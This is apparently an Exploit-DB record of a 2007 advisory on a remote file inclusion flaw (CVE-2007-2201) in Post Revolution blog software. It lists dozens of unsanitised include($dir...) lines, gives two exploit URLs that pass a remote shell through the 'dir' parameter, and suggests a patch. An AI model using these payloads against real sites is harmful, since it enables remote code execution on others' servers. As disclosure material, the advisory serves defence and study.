{
  "id": "3785",
  "title": "Post REvolution 0.7.0 RC 2 - &#039;dir&#039; Remote File Inclusion",
  "cve": "CVE-2007-2201",
  "vuln_type": "unknown",
  "code": "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n                         Post Revolution Remote File Inclusion\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n                         Affected Software .: Post Revolution 6.6 / 7.0 Release Candidate 2\r\n                         Download..: http://www.fabio.com.ar/postrev/\r\n                         Risk ..............: high\r\n                         Date .........: 25/3/2007\r\n                         Found by ..........: InyeXion\r\n                         Contact ...........: InyeXion[at]gmail.com\r\n                         Web .............: Www.InyeXion.com.ar\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n    Affected File:\r\n/common.php\r\n/themes/default/preview_post_completo.php\r\n\r\n Vulnerable Code:\r\n\r\n/common.php\r\n\r\nLine [10]       include ($dir.\"themes/\".$config_data[\"template\"].\"/encabezado.php\");\r\nLine [16]       include ($dir.\"themes/\".$config_data[\"template\"].\"/cuerpo.php\");\r\nLine [22]       include ($dir.\"themes/\".$config_data[\"template\"].\"/pie.php\");\r\nLine [37]       include ($dir.\"themes/\".$config_data[\"template\"].\"/menu_principal.php\");\r\nLine [49]       include ($dir.\"themes/\".$config_data[\"template\"].\"/error.php\");\r\nLine [129]      include ($dir.\"themes/\".$config_data[\"template\"].\"/login_form.php\");\r\nLine [135]      include ($dir.\"themes/\".$config_data[\"template\"].\"/logout.php\");\r\nLine [174]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [272]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [282]      include ($dir.\"themes/\".$config_data[\"template\"].\"/seccion.php\");\r\nLine [360]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [446]      include ($dir.\"themes/\".$config_data[\"template\"].\"/post.php\");\r\nLine [460]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [543]      include ($dir.\"themes/\".$config_data[\"template\"].\"/archivo_noticias.php\");\r\nLine [549]      include ($dir.\"themes/\".$config_data[\"template\"].\"/cuerpo_archivo.php\");\r\nLine [570]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [628]      include ($dir.\"themes/\".$config_data[\"template\"].\"/post_completo.php\");\r\nLine [641]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [661]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [680]      include ($dir.\"themes/\".$config_data[\"template\"].\"/posts_usuario.php\");\r\nLine [692]      include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [715]      include ($dir.\"themes/\".$config_data[\"template\"].\"/comment_encabezado.php\");\r\nLine [750]      include ($dir.\"themes/\".$config_data[\"template\"].\"/comment.php\");\r\nLine [770]      include ($dir.\"themes/\".$config_data[\"template\"].\"/comment_form.php\");\r\nLine [776]      include ($dir.\"themes/\".$config_data[\"template\"].\"/info.php\");\r\nLine [782]      include ($dir.\"themes/\".$config_data[\"template\"].\"/info.php\");\r\nLine [1054]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1106]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_head.php\");\r\nLine [1124]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_opc.php\");\r\nLine [1128]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_pie.php\");\r\nLine [1159]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_head_ver.php\");\r\nLine [1180]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_opc_ver.php\");\r\nLine [1183]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuesta_pie_ver.php\");\r\nLine [1231]     include ($dir.\"themes/\".$config_data[\"template\"].\"/encuestas_anteriores.php\");\r\nLine [1242]     include ($dir.\"themes/\".$config_data[\"template\"].\"/tagmenu.php\");\r\nLine [1297]     include ($dir.\"themes/\".$config_data[\"template\"].\"/tagpost.php\");\r\nLine [1310]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1482]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1506]     include ($dir.\"themes/\".$config_data[\"template\"].\"/categoria_enlace.php\");\r\nLine [1521]     include ($dir.\"themes/\".$config_data[\"template\"].\"/enlacefila.php\");\r\nLine [1570]     include ($dir.\"config.php\");\r\nLine [1676]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1678]     include ($dir.\"themes/\".$config_data[\"template\"].\"/buscar.php\");\r\nLine [1685]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1723]     include ($dir.\"themes/\".$config_data[\"template\"].\"/resultado.php\");\r\nLine [1730]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1766]     include ($dir.\"themes/\".$config_data[\"template\"].\"/busq-dato.php\");\r\nLine [1772]     include ($dir.\"themes/\".$config_data[\"template\"].\"/busq-resultado.php\");\r\nLine [1778]     include ($dir.\"themes/\".$config_data[\"template\"].\"/busq-resultado.php\");\r\nLine [1790]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1813]     include ($dir.\"themes/\".$config_data[\"template\"].\"/categoria_descarga.php\");\r\nLine [1834]     include ($dir.\"themes/\".$config_data[\"template\"].\"/descargafila.php\");\r\nLine [1875]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1892]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1908]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [1924]     include ($dir.\"language/\".$config_data[\"lang\"].\".php\");\r\nLine [2061]     include ($dir.\"include/anti-spam.php\");\r\n\r\n\r\n/themes/default/preview_post_completo.php\r\n\r\nLine [3]                include ($dir.\"themes/\".$config_data[\"template\"].\"/post_completo.php\");\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nExploit:\r\n\r\nhttp://[target]/common.php?dir=Shell\r\nhttp://[target]/themes/default/preview_post_completo.php?dir=Shell\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nFixed bug:\r\n\r\n/common.php and /themes/default/preview_post_completo.php insert\r\n\r\nif((isset($_REQUEST['dir'])  || isset($_GET['dir']) || isset($_POST['dir'])) && !defined(\"dir\")){\r\ndie(\"Fixed bug by InyeXion.\");\r\n }\r\n\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n# milw0rm.com [2007-04-23]",
  "url": "https://www.exploit-db.com/exploits/3785"
}